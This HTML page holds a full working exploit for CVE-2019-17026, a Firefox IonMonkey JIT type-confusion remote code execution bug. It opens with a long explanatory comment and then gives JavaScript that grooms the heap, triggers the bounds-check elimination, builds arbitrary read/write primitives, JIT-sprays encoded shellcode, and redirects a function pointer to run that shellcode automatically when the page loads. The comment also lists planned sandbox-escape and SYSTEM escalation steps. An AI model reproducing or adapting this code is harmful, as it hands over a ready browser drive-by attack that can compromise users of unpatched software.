<html>
<head>
</head>
<body>
<script>

/*

   _______    ________    ___   ____ _______       ____________ ___   _____
  / ____/ |  / / ____/   |__ \ / __ <  / __ \     <  /__  / __ \__ \ / ___/
 / /    | | / / __/________/ // / / / / /_/ /_____/ /  / / / / /_/ // __ \ 
/ /___  | |/ / /__/_____/ __// /_/ / /\__, /_____/ /  / / /_/ / __// /_/ / 
\____/  |___/_____/    /____/\____/_//____/     /_/  /_/\____/____/\____/  

Firefox 64-bit IonMonkey JIT/Type Confusion RCE                                                                            

~

Overview

These three arrays wiil appear in memory sequentially in the order they are declared within the same Nursery Chunk

struct NativeObject {
    void *GroupPtr;
    void *ShapePtr;
    void *SlotsPtr;
    void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
}

typedef struct _ELEMENTS_METADATA {
    uint32_t Flags;
    uint32_t InitializedLength; // The number of elements actually initialized (will be 0 when Array first declared). If you do Array(50) then set index 20 to something, the length will become 20 (and 0-19 will be allocated but marked uninitialized).
    uint32_t Capacity; // Storage allocated for the array
    uint32_t Length; // The literal .length property. Thus Array(50) even though it has an initialized length and capavity of 0 would have a length of 50.
    // ...
} ELEMENTS_METADATA;

After garbage coillection, these appear as:

000000000B5BF100  000000000B5A5A60  <- array 1 native object
000000000B5BF108  000000000B5C21C8 
000000000B5BF110  0000000000000000  
000000000B5BF118  000000000B5BF130  <- array 1 element pointer
000000000B5BF120  0000000000000000  <- array 1 element metadata
000000000B5BF128  0000000000000006  
000000000B5BF130  FFFA800000000000  <- array 1 element data
000000000B5BF138  FFFA800000000000  
000000000B5BF140  FFFA800000000000  
000000000B5BF148  FFFA800000000000  
000000000B5BF150  FFFA800000000000  
000000000B5BF158  FFFA800000000000  
000000000B5BF160  000000000B5A5A90  <- array 2 native object
000000000B5BF168  000000000B5C21C8  
000000000B5BF170  0000000000000000  
000000000B5BF178  000000000B5BF190  
000000000B5BF180  0000007E00000000  <- Overwritten array 2 metadata (elements data)
000000000B5BF188  0000007E0000007E  
000000000B5BF190  0000000000000000  <- array 2 element data (where native object pointer actually goes)
000000000B5BF198  0000000000000000  
000000000B5BF1A0  0000000000000000  
000000000B5BF1A8  0000000000000000  
000000000B5BF1B0  0000000000000000  
000000000B5BF1B8  0000000000000000  
000000000B5BF1C0  000000000B5A5AC0  <- Start of array 3 native object
000000000B5BF1C8  000000000B5C21C8 
000000000B5BF1D0  0000000000000000  
000000000B5BF1D8  000000000B5BF1F0  
000000000B5BF1E0  0000000000000000  <- array 3 metadata
000000000B5BF1E8  0000000000000006  
000000000B5BF1F0  0000000000000000  <- Element pointer mutable array 3
000000000B5BF1F8  0000000000000000  
000000000B5BF200  0000000000000000  

There are several key indexes which line up with this layout in memory:
1. Corruption of Array 2 metadata is done with indexes 10 and 11 of Array 1 (offsets 0x50 and 0x58 from Array 1 element data): 0x000000000B5BF180 - 000000000B5BF130
2. The slot pointer of the Array 3 native object is accessed with index 8 of Array 2 (offset 0x40 from Array 2 element data): 000000000B5BF1D0 - 000000000B5BF190

The heavy dependence on double floating points in this exploit causes a variety of issues to be considered.
Primarily, that certain values (particularly those with certain of their most significant 64 bits set)
cannot be treated as doubles by JS. This leads to many limitations:
1. The shellcode being JIT sprayed must be able to be 100% encoded as valid doubles. It may need to be
   modified (such as inserting NOPs at key offsets) to accomodate this reality.
2. The initial read primitive (memory leaking doubles) cannot leak 8 byte chunks of memory which cannot
   be interpreted as doubles. In certain cases, JS may even interpret them as tagged pointers, causing
   them to be dereferenced and crashing the process.
3. Both the read/write primitives cannot target addresses which cannot be stored as doubles since these
   addresses themselves must be stored and set as doubles in this source code. Similarly the value itself
   being written in the write primitive must be able to be encoded as a valid double otherwise it could
   not be passed as a double param to the arbitrary write function.
   
The R/W quirks in this exploit lead to some interesting issues and workarounds. Certain types of objects
in JS will be stored on the heap (which is only using 32-bits of the 64 bit address space and is thus
always interpreted as a valid double) while others (such as JIT'd code) will be stored in newly allocated
+RX virtual memory, which is going to use all 64-bits of its address space. This means that objects
stored on the stack/heap are going to generally be fair game, while JIT'd/non-heap regions will be off
limits to the initial R/W primitives.

Design

?

Payload

Presently the payload is a 64-bit MessageBox shellcode which will JIT sprayed as part of a series of floats
within an ordinary JS function (each line fo which containing a reference to atleast one 8 byte chunk of the
shellcode. Note that unlike other exploits such as my previous re-creation of CVE-2020-0674, there is a
dramatic reduction in complexity when it comes to shellcode execution and stealth in the context of a JIT
exploit. There is no need for a ROP chain to bypass DEP, as the JIT sprayed shellcode will already exist
within +RX regions of JIT memory. This means that there is also no need to concern oneself with exploit
mitigation features such as StackPivot protection, CallerCheck, SimExec etc. as these are ROP-oriented
mitigations. 

The shellcode source code itself can be found here: https://github.com/forrest-orr/ExploitDev/blob/master/Shellcode/Projects/MessageBox/Original/MessageBox64.asm

Notably, the task of converting a shellcode into an array of valid double floats can be quite tedious. Many
8 bytes sequences in the shellcode will not be considered to be valid doubles and thus cannot be properly encoded.
My solution to this was to identify the offsets in the shellcode which had double encoding issues and pad them
with NOP instructions until eventually the entire shellcode could be encoded as a single array of double floating
point values inn JS.

Despite these many benefits (as compared to exploits which require ROP chains and CFG bypass), the shellcode
in this exploit does still have one weakness which is EAF (it is resolving its API addresses via the Kernel32.dll
and NTDLL.DLL Export Address Tables. This may be an issue against EMET and its successor Windows Defender Exploit
Guard unless steps are taken to circumvent API resolution via exports, and rather to resolve them through via
imports itstead. 

Future improvements

1. WPAD sandbox escape via RPC chained with CVE-2020-0674
2. EAF/EAF+ bypasses for shellcode
3. Escalation to SYSTEM from LOCAL SERVICE via print spooler vulnerability and impersonation
4. Full attack chain working on Windows 8.1

Quirks

JIT compilation of memory layout post-heap-groom for the primary glitched JS function with the boundscheck
elimination is ineffective on Firefox 70 and 71 despite having only been patched after these releases. It does work
reliably on Firefox 65.

*/

////////
////////
// Global helpers/settings
////////

var JITIterations = 0x10000; // Number of iterations needed to trigger JIT compilation of code. 0x400+ works on FF 65, on 70 not even 0x10000 seems to work (the value in the original exploit at https://github.com/maxpl0it/CVE-2019-17026-Exploit/blob/master/calc.html)
var HelperBuf = new ArrayBuffer(8);
var HelperDouble = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);

////////
////////
// Debug/timer code
////////

var EnableDebug = 1;
var EnableTimers = 0;
var AlertOutput = 1;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// MIR Boundscheck elimination bug/OOB glitch logic
////////

// Note that these cannot be declared as vars
SideEffectArray = [1.1, 1.2, , 1.4]; // MStoreElementHole access to a global sparse array is the unique edge case which resets the prevents it from being considered a dependency of the second Array1 boundscheck (thus allowing the first and second boundscheck to be considered for congruence and the second eliminated by the MIR optimizer)
BugArray1 = new Array(0x20); // This array will be used (after heap grooming) to make the OOB overwrite of BugArray2 metadata. The heap grooming requires the .length be set to 0, but the length will not matter due to boundscheck elimination (the capacity however still will).
BugArray2 = new Array(0x20); // This array will be used to read and set pointers reliably and repeatably in MutableArray
MutableArray = new Array(0x20); // The mutable array with capacity/boundscheck constraints lifted. Use of this array is primary limited to corrupting its Native Object pointers and reading/writing via its artificial "properties"

SideEffectArray.__defineSetter__("-1", function(x) { // Side effects called for OOB SideEffectArray access at index -1
    // Key to understand here is that setting these lengths to 0 and having GC manipulate them into pointing at each other could be done without the boundscheck elimination bug. The boundscheck elimination bug however is what allows them to actually access each other, as it is necessary to set .length to 0 to do the GC trick and the boundschecks are based on .length. Note that access to all of these arrays will still be limited by their capacity metadata field despite elimination of their .length boundscheck.
    BugArray1.length = 0;
    BugArray2.length = 0;
    MutableArray.length = 0;
    GC(); // The element data of each array will be freed, and each array will "fall" into the slot it left behind, thus leading to the Array1 element data pointer pointing at BugArray2 start (its metadata) and BugArray2 element data pointer pointing at MutableArray metadata,
});

function GC() { // Call the GC - Phoenhex function
    BufSize = (128 * 1024 * 1024); // 128MB
    
    for (i = 0; i < 3; i++) {
        var x = new ArrayBuffer(BufSize); // Allocate locally, but don't save
    }
}

function BuggedJITFunc(SideEffectIndex, Index, DblVal, bAct) {
    // Removes future bounds checks with GVN
    
    BugArray1[Index] = 4.2;
    BugArray1[Index - 1] = 4.2;

    // Triggers the side-effect function when a -1 index provided
    
    if(bAct)
    SideEffectArray[SideEffectIndex] = 2.2; // In the event the index 

    // Write out-of-bounds and corrupt Array2. Normally boundscheck would prevent this based on .length. Note that despite the bugged elimination of this check, access is still limited to the Array1 capacity metadata field.
    
    BugArray1[Index] = DblVal; // Corrupt the Array2 capacity and length element metadata - 0x7e 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
    BugArray1[Index - 1] = 2.673714696616e-312; // Corrupt the Array2 flags and initialized length element metadata - 0x00 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
}

for(i = 0; i < JITIterations; i++) {
    SideEffectArray.length = 4; // Reset the length so that StoreElementHole node is used
    BuggedJITFunc(5, 11, 2.67371469724e-312, (i & 1) === 1);
}

// Call the JIT'd bugged function one more time, this time with an OOB write index of -1. There is substantial significance to using -1 as opposed to some other (larger) index which would still go OOB and trigger a side effect. The reason being that -1 is considered an "invalid index" (not just an OOB index) and is treated differently. OOB writes to the SideEffectArray with valid albeit indexes which will fail the boundscheck restrictions will not trigger useful side effects. The reason for this being that access to valid indexes will cause the creation of a MSetPropertyCache node in the MIR, a node which is not susceptible to the exploit condition. The MIR instruction chosen to handle the SideEffectArray OOB MUST be MStoreElementHole, and MStoreElementHole will only be selected in the event of an INVALID index access, not simply an OOB one.

SideEffectArray.length = 4; // Reset the length one more time
BuggedJITFunc(-1, 11, 2.67371469724e-312, true);

/*
for(i = 0; i < 10; i++) {
    HelperDouble[0] = BugArray2[i];
    DebugLog("Leaked from BugArray2 index " + i.toString(10) + ": 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
}

for(i = 0; i < 20; i++) {
    HelperDouble[0] = BugArray1[i];
    DebugLog("Leaked from BugArray1 index " + i.toString(10) + ": 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
}*/

// Initialize mutable array properties for R/W/Address-of primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

////////
////////
// Arbitrary read/write/address-of primitives
////////

/*

What makes the read "weak" is that the value which is actually being read at the provided address
must be a valid double. If specific bits are set in its most significant bits, it may be invalid
as a double and may be interpreted as a tagged pointer instead, which will cause JS to dereference it
and crash the process.

The MutableArray.NativeObj.SlotsPtr access via BugArray2[8] for both the R/W primitives translates
to offset 0x40 from BugArray2.NativeObj.ElementPtr.

*/

function AttemptLeakDbl(TargetAddressDbl) {
    SavedSlotsPtr = BugArray2[8];
    BugArray2[8] = TargetAddressDbl; // properties pointer - change the pointer of x
    //DebugLog("Weak read set slots pointer of Array2 native object to 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    result = MutableArray.x;
    BugArray2[8] = SavedSlotsPtr;
    return result;
}

function WriteMemDbl(TargetAddressDbl, Val) { 
    SavedSlotsPtr = BugArray2[8];
    BugArray2[8] = TargetAddressDbl;
    MutableArray.x = Val;
    BugArray2[8] = SavedSlotsPtr;
}

/*

The concept here is that the mutable array slots pointer (in its native object struct) is
going to be pointing at an array of 3 property values (for x, y and z). Since we are trying
to leak the object address (which will be written into the property array slots for x, y or z)
as a double, we may fail to leak its address if this address cannot be represented as a valid
double. Thus the trick is to set the slots pointer in the mutable array native object ahead by
4 bytes. This the result that the object address (previously only in the "y" slot) can now be
partially read (32-bits at a time) from both "x" and "y" and that these values are now certain to
be valid doubles.

We can ensure the resulting double is valid by using bitwise AND to filter off the significant bits
responsible for differentiating between a valid and non-valid double.

*/

function AttemptLeakObjectAddressDbl(Obj) {
    SavedSlotsPtr = BugArray2[8]; 
    
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    HelperDouble[0] = BugArray2[8];
    HelperDword[0] = HelperDword[0] + 4;
    BugArray2[8] = HelperDouble[0];
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDouble[0] = MutableArray.x;
    LeakedLow = HelperDword[1];
    HelperDouble[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    BugArray2[8] = SavedSlotsPtr;
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDouble[0];
}

/*

These primitives solve the issue of attempting to read 8 bytes in memory which may be invalid
doubles and thus misinterpreted as pointers (for example if the tagged pointer bits are set).

The solution is to simply create a double float array, and then overwrite its data pointer
to point to the precise region we want to read. The key concept here is that it reduces the
ambiguity on the part of the JS engine. Since the JS engine knows that the value at this
address is explicitly a double float, it will not attempt to potentially interprete it as an
object pointer even if those tagged bits are set.

*/

MutableDblArray = new Float64Array(1); // Used for the strong read
MutableDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function ExplicitLeakDbl(TargetAddress) {
    WriteMemDbl(MutableDblArrayDataPtr, TargetAddress);
    return MutableDblArray[0];
}

////////
////////
// JIT spray/egghunter shellcode logic
////////

function Shellcode(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    S1 = -3.384548150597339e+269;
    S2 = -9.154525457562153e+192;
    S3 = 4.100593930228791e+42;
    S4 = -5.954547129302479e-264;
    S5 = -9.244463753049997e-33;
    S6 = 2.7270716145836e-310;
    S7 = -1.311379727091029e+181;
    S8 = 1.1053351980286266e-265;
    S9 = -6.157050177423659e-264;
    S10 = 2.719585641407824e-276;
    S11 = 9.33863949997304e-310;
    S12 = 2.1570006298724987e+267;
    S13 = 1.51645067558523e+45;
    S14 = 4.9104595322442735e+252;
    S15 = 1.0039474593959752e-89;
    S16 = 5.217422081935911e+268;
    S17 = 2.2397773113094206e+84;
    S18 = 2.9653441733280347e+40;
    S19 = -7.555905394876245e-293;
    S20 = -1.5162080322508992e+82;
    S21 = 3.909631192677548e+112;
    S22 = 1.5636948002514616e+158;
    S23 = -2.6295656969507476e-254;
    S24 = -6.001472476578534e-264;
    S25 = 9.25337251529007e-33;
    S26 = 4.419915842157561e-80;
    S27 = 8.07076629722016e+254;
    S28 = 3.736523284e-314;
    S29 = 3.742120352320771e+254;
    S30 = 1.0785207726585762e-32;
    S31 = -2.6374368557341455e-254;
    S32 = 1.2702053652464168e+145;
    S33 = -1.3113796337500435e+181;
    S34 = 1.2024564583763433e+111;
    S35 = 1.1326406542153807e+104;
    S36 = 9.646933740426927e+39;
    S37 = -2.5677414592270957e-254;
    S38 = 1.5864445474697441e+233;
    S39 = -2.6689139052065564e-251;
    S40 = 1.0555057376604044e+27;
    S41 = 8.364524068863995e+42;
    S42 = 3.382975178824556e+43;
    S43 = -8.511722322449098e+115;
    S44 = -2.2763239573787572e+271;
    S45 = -6.163839243926498e-264;
    S46 = 1.5186209005088964e+258;
    S47 = 7.253360348539147e-192;
    S48 = 1.4424067400899e-309;
    S49 = -2.4000983157210945e-284;
    S50 = -1.1554348699939644e+156;
    S51 = 1.4556863465871746e+39;
    S52 = -53025350.160568245;
    S53 = -6.592137368547996e+232;
    S54 = -5.954496632196354e-264;
    S55 = 1.0553922879130128e+27;
    S56 = -1.098771600725952e-244;
    S57 = -2.5574368247075522e-254;
    S58 = 3.618778572061404e-171;
    S59 = -1.4656824334476123e+40;
    S60 = 4.6232700581905664e+42;
    S61 = -3.6562604268727894e+125;
    S62 = 8.3411541370016e-310;
    S63 = 5.89235961469707e-306;
    S64 = 1.087942540584584e-309;
    S65 = -1.124295257309982e-244;
    S66 = 9.721361635762766e-270;
    S67 = 2.182615256525135e-82;
    S68 = 1.9115806608168328e+214;
    S69 = 6.81191715765015e+38;
    S70 = -1.3715310129144283e+305;
    S71 = -8397076621.682557;
    S72 = 5.252044005191025e-309;
    S73 = -2.70639260179825e+297;
    S74 = 6.80564913620481e+38;
    S75 = 4.46014544172855e+43;
    S76 = -1.265787460377773e-37;
    S77 = -1.773661455514501e+302;
    S78 = 6.805648324908426e+38;
    S79 = -6.280309711216237e-261;
    S80 = -1.5959006450266017e+211;
    S81 = -2.049784425552384e+303;
    S82 = 2.5190632058882454e+151;
    S83 = -6.039552836032778e-264;
    S84 = 5.808192539620053e+250;
    S85 = -2.6834714383866406e-48;
    S86 = -1.365491462675685e+305;
    S87 = -1.3660571134571838e+305;
    S88 = -3.5855233691660036e+16;
}

function EggHunter(TargetAddressDbl) {
    HelperDouble[0] = TargetAddressDbl;

    for(i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The original used 100 which occasionally failed. The most likely explanation for this is that the more code is in the JIT'd Shellcode function (which includes the ASM used to access the floats) the further down into the JIT'd +RX region we will find the double float constant array.
        DblVal = ExplicitLeakDbl(HelperDouble[0]); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            DebugLog("[+] Shellcode offset at 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            
            return HelperDouble[0];
        }
        
        HelperDword[0] = HelperDword[0] + 8;
    }
    
    return 0.0;
}

////////
////////
// Primary high level exploit logic
////////

function Exploit() {
    // JIT compile the shellcode and leak its JIT compilation address (this will be within a +RX region of virtual memory)
    
    for(i = 0; i < JITIterations; i++) Shellcode(); // JIT spray the shellcode
    ShellcodeFuncObjAddress = AttemptLeakObjectAddressDbl(Shellcode);
    HelperDouble[0] = ShellcodeFuncObjAddress; // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    DebugLog("ShellcodeFuncObjAddress pointer: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    ShellcodeJSFuncObjAddress = HelperDouble[0];
    JITInfoAddress = AttemptLeakDbl(HelperDouble[0]); // In the event that the first AttemptLeakDbl after the first AttemptLeakObjectAddressDbl fails, MutableArray.x will not change from its initialized value of 0x41414141 (this is its value AFTER the +4 shift that occurs in the weak_addrod)
    HelperDouble[0] = JITInfoAddress;
    
    // Verify that MutableArray.x was not its initialized value during the last arbitrary read. This would only be the case if the slots ptr has NEVER been successfully overwritten post-addrof primitive (the address we attempted to read was not a valid double).
    
    if(HelperDword[0] == 0x41414141) {
        HelperDouble[0] = ShellcodeJSFuncObjAddress;
        DebugLog("Arbitrary read primitive failed on address 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        //window.location.reload();
    }
    else {
        // Arbitrary reads (via double) have been successful. Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a 64-bit pointer at offset 0 of this struct)
        
        ShellcodeFuncJITAddress = AttemptLeakDbl(JITInfoAddress);
        HelperDouble[0] = ShellcodeFuncJITAddress;
        DebugLog("Shellcode function object JIT code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        
        // Due to the VirtualAlloc'd +RX address associated with the JIT'd code nearly always using all 64-bits for its address (as opposed to only 32 of them for stack/heap allocations) leaking it via double the way we have been may be ineffective. Setup a stronger read primitive.
        MutableDblArrayAddress = AttemptLeakObjectAddressDbl(MutableDblArray);
        HelperDouble[0] = MutableDblArrayAddress;
        HelperDword[0] = HelperDword[0] + 56; // Float64Array data pointer
        MutableDblArrayDataPtr = HelperDouble[0];
    
        // Float data within a JIT'd function is stored in isolation and referenced by address from the actual function code. Use an egg hunter to search and a compiled copy of this JIT sprayed shellcode.
        ShellcodeAddress = EggHunter(ShellcodeFuncJITAddress); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the Shellcode function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
            WriteMemDbl(JITInfoAddress, ShellcodeAddress);
			var TestStr = "test string text... shellcode will go here!";
			HelperDouble[0] = AttemptLeakObjectAddressDbl(TestStr);
			HelperDword[0] = HelperDword[0] + 8; // BSTR object itself has the literal unicode string pointer at offset +8 of its struct
			HelperDouble[0] = ExplicitLeakDbl(HelperDouble[0]);
			DebugLog("BSTR address 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            Shellcode();
        }
    }
}

Exploit()
</script>
</body>
</html>
